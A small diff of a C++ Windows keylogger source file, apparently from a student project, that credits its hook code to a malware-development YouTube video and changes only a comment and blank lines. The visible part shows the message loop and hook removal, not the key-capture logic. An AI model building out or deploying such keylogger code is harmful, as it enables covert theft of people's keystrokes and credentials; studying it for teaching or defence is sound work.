@@ -1,10 +1,9 @@
 // keylogger hook code comes from S12 youtube video: https://www.youtube.com/watch?v=ceUVxeq4Eqk&ab_channel=S12-MalwareDevelopment
-// email functionality written by z5410231
+// base win api function done by z5410231 check references for winapi link
 
 #include <windows.h>
 #include <stdio.h>
 #include <fstream>
-
 
 int keyCount = 0;
 // hook
@@ -37,7 +36,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     while (GetMessage(&msg, NULL, 0, 0) > 0) {
         TranslateMessage(&msg); //win32 function to translate keystrokes
         DispatchMessage(&msg); //win32 function.
-
     }
     // delete hook
     UnhookWindowsHookEx(hook);
